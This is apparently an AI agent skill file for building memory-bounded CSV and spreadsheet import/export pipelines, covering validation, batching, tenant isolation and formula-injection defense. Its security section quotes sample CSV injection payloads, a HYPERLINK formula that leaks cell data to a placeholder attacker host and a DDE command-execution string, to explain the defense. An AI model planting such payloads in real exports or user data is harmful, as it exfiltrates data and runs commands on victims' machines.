---
name: import-export-data-processing
description: "Engineers safe, memory-bounded CSV, spreadsheet, and bulk data import/export pipelines with header and schema validation, duplicate detection, relational integrity checks, chunked streaming, per-row error reporting, formula injection defense, and audit reconciliation. Activate when building file imports, bulk uploads, or data exports. Do not use for simple single-record CRUD endpoints."
license: "MIT"
compatibility: "Antigravity (App, CLI, IDE) and Agent Skills 1.0 compatible agents"
metadata:
  author: "reusable-ai-development-skills"
  version: "1.0.0"
  skill_id: "SKILL-26"
  category: "Data and Integrations"
---

# Import/Export & Bulk Data Processing

This skill governs the design, validation, security, and memory-bounded execution of bulk data import and export pipelines (CSV, TSV, Excel/XLSX, JSONL, NDJSON, and XML). It prevents common bulk-processing failures including out-of-memory (OOM) crashes on large files, partial silent data corruption, foreign-key orphans, N+1 per-row database queries, and CSV/spreadsheet formula injection vulnerabilities.

## 1. Activation Conditions

Activate this skill when the user request or engineering task involves:
- Building or reviewing CSV, spreadsheet (`.xlsx`), or JSONL file import and bulk upload features.
- Implementing data export downloads, scheduled report generation, or cross-system data synchronization jobs.
- Handling row-by-row schema validation, duplicate detection, idempotent upserts, and actionable per-row error reporting.
- Fixing memory exhaustion (OOM), request timeouts, or slow execution during large dataset imports or exports.

## 2. When Not to Use

Do not use this skill as the primary workflow for:
- Standard single-record REST/GraphQL form submissions: route to `api-security-webhook-reliability` (`SKILL-11`) or `ui-ux-design-systems` (`SKILL-20`).
- Binary media uploads (avatars, images, PDFs) without tabular/record parsing: route to `application-security-owasp` (`SKILL-10`).
- Database schema migrations (`ALTER TABLE`): route to `database-architecture-integrity` (`SKILL-24`).

## 3. Scope and Objectives

Every import, export, or bulk data processing workflow must cover:
- **File Security & Format Validation**: Enforce strict upload size limits, verify file extensions and MIME/magic bytes, handle UTF-8 BOM (`\xEF\xBB\xBF`) and encoding normalization cleanly, and parse CSV dialects safely (quoted newlines, escaped quotes, explicit delimiter detection).
- **Header & Schema/Type Validation**: Validate column headers (required columns present, unexpected/misspelled headers flagged early) before processing rows. Validate each cell's data type, format (ISO dates, numeric precision, enum values), and business rules.
- **Duplicate Detection & Upsert Strategy**: Detect duplicates both *within* the uploaded file itself (in-file duplicate keys) and *against* existing database records. Define an explicit conflict policy (`reject duplicates`, `skip existing`, or `idempotent upsert` on a unique business key).
- **Relational Integrity**: Verify that referenced foreign keys (e.g., `category_sku`, `department_id`, `tenant_id`) exist and belong to the authorized tenant before committing writes, prefetching lookup maps per chunk rather than issuing 1 query per row.
- **Transaction Safety (All-or-Nothing vs. Partial Batch Isolation)**:
  - Explicit **All-or-Nothing** mode: Validate all rows first (or run inside a transaction/staging table) and roll back completely if any row fails.
  - Explicit **Partial Import** mode: Commit valid chunks independently and generate a downloadable error report of rejected rows so users can fix and re-upload only failed rows.
- **Batch & Chunked Processing**: Group database writes into bounded chunks (`500-2,000` rows per batch `INSERT` / `UPSERT`) instead of executing individual single-row `INSERT` statements in a loop.
- **Large-File Streaming (Memory-Bounded Execution)**: Stream files line-by-line or chunk-by-chunk (using generators, iterators, or stream readers/writers). Never read an entire multi-megabyte CSV or query result set into memory at once (`O(1)` memory footprint with respect to file size). Offload slow imports/exports (`> 5,000` rows) to background queue workers with progress tracking (`background-jobs-async-processing`, `SKILL-30`).
- **Actionable Per-Row Error Reporting**: Return structured errors containing the `1-based row number` (matching the user's spreadsheet line), `column name`, `rejected value`, and `human-readable reason` (e.g., `"Row 42, Column 'unit_price': Expected positive decimal, got 'N/A'"`).
- **Safe Export & Formula Injection Defense**: Enforce row-level tenant authorization on exports, filter out sensitive PII/secret columns, stream download responses (`Content-Disposition: attachment`), and neutralize CSV/Excel formula injection (cells starting with `=`, `+`, `-`, `@`, `\t`, `\r`).
- **Data Reconciliation & Audit Totals**: Record and return reconciliation counters (`total_rows_read`, `inserted_count`, `updated_count`, `skipped_count`, `failed_count`) and verify that `inserted + updated + skipped + failed == total_rows_read`.

## 4. Prerequisites and Context Requirements

Before implementing an import or export pipeline, determine:
1. **Expected File Volume & Runtime Constraints**: Typical and maximum row counts/file sizes, HTTP request timeout limits, and worker memory limits.
2. **Transaction & Conflict Policy**: Whether business requirements mandate strict all-or-nothing rollback or partial import with an error CSV, and how duplicate keys should be handled.
3. **Target Schema & Tenant Boundary**: Target database tables, unique constraints, foreign keys, and tenant ownership scoping.

## 5. Step-by-Step Workflow

### Step 1: Validate File Envelope, Encoding, and Headers
- [ ] Check file size against a configured maximum before parsing, and store large uploads in temporary/object storage for async worker processing rather than holding HTTP workers open.
- [ ] Strip any leading UTF-8 BOM (`\uFEFF`) from the first header cell, trim header whitespace, and normalize header names (`snake_case` or expected template keys).
- [ ] Compare parsed headers against the required schema. If required columns are missing, abort immediately at row `0` and return the exact list of missing headers.

### Step 2: Stream and Validate Rows in Bounded Chunks
- [ ] Open the input source using a streaming parser (never `file_get_contents()` + `explode("\n")` or `fs.readFileSync()` on unbounded files).
- [ ] Accumulate rows into a bounded chunk (e.g., `500` rows):
  - Track seen unique keys to catch in-file duplicate rows (e.g., `"Row 118 duplicates 'sku' from Row 14"`).
  - Batch-fetch existing foreign keys and existing unique keys for the current chunk in 1-2 `WHERE key IN (...)` queries, strictly scoped to the current `tenant_id`.
  - Validate every column in each row and collect all field errors for that row (do not stop at the first column error in a row).

### Step 3: Execute Transactional Batch Writes
- [ ] For **All-or-Nothing Imports**: Either stage validated rows in a temporary/staging table before a single atomic merge, or wrap the import in a transaction that rolls back if `failed_count > 0`.
- [ ] For **Partial / Chunk-Isolated Imports**: Partition each chunk into `valid_rows` and `invalid_rows`, execute a single bulk `INSERT ... ON CONFLICT DO UPDATE` / `upsert` for `valid_rows` inside a per-chunk transaction, and append `invalid_rows` to the structured error log.
- [ ] Ensure audit fields (`created_by`, `updated_at`, `import_job_id`) are populated on bulk writes.

### Step 4: Engineer Safe, Streaming Exports
- [ ] Authenticate and authorize the exporting user, applying mandatory tenant and role filters (`application-security-owasp`, `SKILL-10`) and excluding internal secrets/hashes (`privacy-data-protection`, `SKILL-12`).
- [ ] Query the database using a cursor or chunked iterator (never `Model::all()` / `findAll()` into memory) and stream rows directly to the HTTP response (`StreamedResponse`) or a background export file.
- [ ] Sanitize every exported string cell against **CSV Formula Injection (DDE / Formula Execution)**:
  - If a string field begins with `=`, `+`, `-`, `@`, `\t` (`0x09`), or `\r` (`0x0D`) (even after leading spaces), prefix it with a single quote `'` (or tab/escape per RFC 4180 + spreadsheet safety rules) while leaving genuine numeric values (`-42.50`) unprefixed if verified by numeric regex.

### Step 5: Reconcile Totals and Verify End-to-End
- [ ] Verify the reconciliation invariant: `total_rows_read == inserted_count + updated_count + skipped_count + failed_count`.
- [ ] Write automated tests covering valid imports, malformed headers, in-file duplicates, cross-tenant foreign key rejection, formula injection sanitization on export, and multi-chunk boundary handling.

## 6. Technology-Specific Adaptation Rules

| Stack / Ecosystem | Streaming Import & Export Idioms | Recommended Libraries & Patterns |
| :--- | :--- | :--- |
| **PHP (Laravel / CodeIgniter)** | Use `LazyCollection::make(function () { fgetcsv(...); })`, `SplFileObject`, `league/csv`, or `openspout/openspout` for streaming `.xlsx`. Use `response()->streamDownload(...)` with `cursor()` / `lazyById()` for exports and `Model::upsert()` for batch writes. | Avoid loading entire sheets into memory with DOM-based Excel parsers on large files; queue large jobs via Laravel Horizon/Queue. |
| **JS / TS (Node.js / Next.js / NestJS)** | Use Node.js `Readable` / `Transform` streams with `csv-parse`, `fast-csv`, or `exceljs` streaming `WorkbookReader` / `WorkbookWriter`. Use `pipeline()` from `node:stream/promises` for backpressure and error cleanup. | Never `await file.text()` on multi-hundred-MB files; stream via `ReadableStream` and batch writes with Prisma `createMany` / raw `UNNEST` upsert. |
| **Python (Django / FastAPI / Data Pipelines)** | Use standard library `csv.DictReader` / `csv.writer` over file iterators, `openpyxl` in `read_only=True` / `write_only=True` mode, or `polars` `scan_csv` / `pandas.read_csv(..., chunksize=1000)`. Stream HTTP exports via FastAPI/Django `StreamingHttpResponse`. | Use `bulk_create(..., update_conflicts=True, batch_size=1000)` in Django or SQLAlchemy `insert().on_conflict_do_update()`. |
| **Go (`encoding/csv`)** | Loop with `reader.Read()` until `io.EOF` (never `reader.ReadAll()` on large inputs). Use `pgx.CopyFrom` or batched multi-row `INSERT` statements. Stream exports via `http.ResponseWriter` + `csv.NewWriter`. | Enforce `http.MaxBytesReader` on upload endpoints and pass `ctx` for cancellation. |
| **Java / Spring & C# / .NET** | In Java, use Jackson CSV `MappingIterator`, Apache Commons CSV, or Apache POI `SXSSFWorkbook` (streaming XLSX) / Spring Batch chunk steps. In C#, use `CsvHelper` with `IAsyncEnumerable` and EF Core `ExecuteUpdate` / bulk extensions. | Avoid `XSSFWorkbook` (in-memory DOM) for large `.xlsx` files; use `SXSSFWorkbook` with bounded row window. |
| **Rust (`csv` / `calamine` / `tokio`)** | Use `csv::Reader::from_reader` iterating over `ByteRecord` or `DeserializeRecordsIter` with `sqlx` `QueryBuilder` batch inserts. | Stream chunks with bounded memory channels. |

### CSV Formula Injection Sanitization Reference

```python
import re

NUMERIC_RE = re.compile(r"^[+-]?(\d+(\.\d+)?|\.\d+)$")
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def sanitize_csv_cell(value: object) -> str:
    if value is None:
        return ""
    text = str(value)
    stripped = text.lstrip(" ")
    if stripped.startswith(DANGEROUS_PREFIXES) and not NUMERIC_RE.match(stripped):
        return "'" + text
    return text
```

## 7. Security and Safety Considerations

- **CSV / Spreadsheet Formula Injection (OWASP)**: Attackers frequently submit payloads like `=HYPERLINK("http://evil.tld?leak="&A1, "Click")` or `=cmd|' /C calc'!A0` in user profile fields (name, address, notes) waiting for an admin to export a CSV and open it in Excel/Google Sheets. Always sanitize exported text cells starting with `=`, `+`, `-`, `@`, `\t`, or `\r`.
- **Cross-Tenant Relational Hijacking (IDOR in Imports)**: When an import row references a `project_id`, `user_id`, or `category_id`, always filter the lookup query by the authenticated user's `tenant_id` (`WHERE id IN (...) AND tenant_id = ?`). Never allow a CSV import to link records to another tenant's foreign keys.
- **Zip Bomb & XML External Entity (XXE) in `.xlsx` Files**: Remember that `.xlsx` files are ZIP archives of XML files. Configure XML/XLSX parsers with external DTD/entity resolution disabled (`disallow-doctype-decl`) and enforce a maximum uncompressed byte ratio to prevent Zip Bomb memory exhaustion.
- **PII & Audit Logging**: Log who triggered an import or export, the timestamp, filter parameters, and row counts (`observability-incident-diagnosis`, `SKILL-34`), and enforce retention limits on temporary import/export files in object storage.

## 8. Verification Criteria

Before declaring an import/export task complete:
1. **Streaming & Batching Proof**: Code inspection and tests confirm that files and queries are processed via streaming iterators and bounded batch writes (`chunk_size <= 2000`), never loading full files or unbounded table dumps into memory.
2. **Validation & Error Reporting Proof**: Automated tests verify missing header detection, per-row type/constraint error messages with accurate 1-based row numbers, and duplicate handling.
3. **Security & Reconciliation Proof**: Formula injection strings (`=1+1`, `@SUM(...)`, `+cmd`) are neutralized on export, cross-tenant foreign keys are rejected on import, and reconciliation counters sum to `total_rows_read`.

## 9. Failure Handling and Edge Cases

- **BOM, Mixed Line Endings (`\r\n` vs `\n`), and Trailing Empty Lines**: Strip UTF-8 BOM (`\xEF\xBB\xBF`), support universal newline parsing, and ignore completely blank trailing lines at the end of CSV files rather than reporting a fake validation error on the final empty line.
- **Mid-Stream Network Disconnect or Worker Restart**: Make background import jobs idempotent (using an upsert key or tracking last processed chunk offset) so retrying a crashed job does not create duplicate rows.
- **Excel Leading-Zero Stripping (ZIP codes, Phone Numbers, SKUs)**: Format string identifiers with leading zeros (`"00124"`) explicitly as text columns in `.xlsx` exports and validate them as strings during imports.

## 10. Expected Outputs and Reporting Requirements

Provide a structured report using the following template:

```markdown
## Import/Export & Bulk Data Processing Report

### 1. Pipeline Architecture
- **Direction & Formats**: [Import / Export | CSV / XLSX / JSONL]
- **Execution Mode**: [Synchronous Streaming (<5k rows) / Async Background Job + Progress State]
- **Memory & Batch Strategy**: [Streaming parser used | Batch size: e.g., 500 rows/chunk]
- **Transaction & Conflict Policy**: [All-or-Nothing / Partial Chunk Isolation | Upsert key / Reject duplicates]

### 2. Security & Integrity Controls
- **Header & Type Validation**: [Summary of required columns and type rules]
- **Tenant & Foreign Key Verification**: [How cross-tenant references are blocked]
- **Formula Injection & Upload Safety**: [Sanitization of `=`, `+`, `-`, `@`, `\t`, `\r` & size/MIME limits]
- **Reconciliation Counters**: [`total_rows_read = inserted + updated + skipped + failed`]

### 3. Verification Summary
| Test Scenario | Status (PASS / FAIL / BLOCKED / NOT TESTED) | Evidence |
| :--- | :--- | :--- |
| Valid Multi-Chunk Import / Export | [Status] | [Test command & output] |
| Malformed Headers /BOM / Empty Rows | [Status] | [Test command & output] |
| Per-Row Error Reporting & Duplicate Keys | [Status] | [Test command & output] |
| CSV Formula Injection & Tenant Isolation | [Status] | [Test command & output] |
```

## 11. Interoperability and Skill Routing

- **Upstream Skills**:
  - `database-architecture-integrity` (`SKILL-24`): Supplies the unique constraints and foreign key rules required for safe `UPSERT` operations.
- **Downstream / Co-Activated Skills**:
  - `background-jobs-async-processing` (`SKILL-30`): Executes large file imports and exports asynchronously with retry and progress reporting.
  - `application-security-owasp` (`SKILL-10`) and `privacy-data-protection` (`SKILL-12`): Governs file upload security, authorization, and PII export controls.
  - `query-optimization-performance` (`SKILL-25`): Ensures chunked export queries and batch foreign-key lookups use proper indexes.

## 12. Source References

- **RFC 4180 (Common Format and MIME Type for CSV Files)**: https://datatracker.ietf.org/doc/html/rfc4180
- **OWASP CSV Injection Defense**: https://owasp.org/www-community/attacks/CSV_Injection
- **Shared Library Reference (OWASP ASVS File Upload & Input Validation)**: [../../references/owasp-asvs-top10-reference.md](../../references/owasp-asvs-top10-reference.md)
- **Shared Library Reference (Memory & Profiling Best Practices)**: [../../references/core-web-vitals-performance-reference.md](../../references/core-web-vitals-performance-reference.md)
